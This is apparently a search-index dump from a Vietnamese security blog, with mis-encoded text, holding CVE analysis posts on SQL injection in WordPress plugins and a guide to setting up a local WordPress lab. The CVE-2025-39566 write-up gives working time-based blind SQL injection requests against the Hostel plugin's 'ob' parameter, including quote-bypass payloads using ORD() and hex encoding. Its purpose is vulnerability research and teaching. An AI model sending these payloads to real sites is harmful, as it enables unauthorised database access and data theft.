href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay 